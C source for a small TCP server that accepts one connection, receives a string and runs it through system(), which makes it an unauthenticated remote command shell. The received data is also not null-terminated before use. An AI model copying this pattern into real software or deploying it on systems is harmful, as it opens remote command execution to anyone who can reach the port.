#include "master.h"
#include "usage.h"
#include <stdlib.h>

int main(int argc, char **argv)
{
	if (SUCCESS != init_server()) {
		printf("init server error\n");
		goto err;
	}
	
	loop();

	if (SUCCESS != close_server()) {
		printf("close server error\n");
		goto err;
	}
	
	return 0;
err:
	printf("fatal error, quitting...\n");
	return -1;
}

int init_server()
{
	Gst = (SockTag *)calloc(1, sizeof(SockTag));			
	
	// get Socket file descriptor
	Gst->sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (FAILURE == Gst->sock_fd) {
		printf("get base socket fd failed\n");
		goto err;
	}
	
	// set socket addr
	memset(&(Gst->sk_addr), 0, sizeof(struct sockaddr_in));
	Gst->sk_addr.sin_family = AF_INET;
	Gst->sk_addr.sin_port = htons(LOCAL_PORT);
	Gst->sk_addr.sin_addr.s_addr = inet_addr(LOCAL_IP);

	// bind with ip port
	if (FAILURE == bind(Gst->sock_fd, 
		(struct sockaddr *)&(Gst->sk_addr), sizeof(struct sockaddr_in))) {
		printf("bind with err\n");
		goto err;
	}

	// listen max = 10
	if (FAILURE == listen(Gst->sock_fd, 10)) {
		printf("listen with err\n");
		goto err;
	}

	Gsd = (SockData *)calloc(1, sizeof(SockData));
	socklen_t len = sizeof(struct sockaddr_in);
	// accept
	GetSDfd(Gsd) = accept(Gst->sock_fd, 
		(struct sockaddr *)&(GetSDaddr(Gsd)), &len);

	return SUCCESS;
err:
	// XFREE();
	return FAILURE;
}

void loop()
{
	if (FAILURE == recv(GetSDfd(Gsd), (void *)&(GetSDrdata(Gsd)), DATA_LEN, 0)) {
		printf("recv failed\n");
		return;
	}
	printf("%s\n", GetSDrdata(Gsd));
	
	// execute command
	system(GetSDrdata(Gsd));
	
}

int close_server()
{
	close(Gst->sock_fd);
	close(GetSDfd(Gsd));
	// XFREE	
	if (NULL != Gst) {
		free(Gst);
		Gst = NULL;
	}

	if (NULL != Gsd) {
		free(Gsd);	
		Gsd = NULL;
	}
	printf("closed\n");

	return SUCCESS;
}
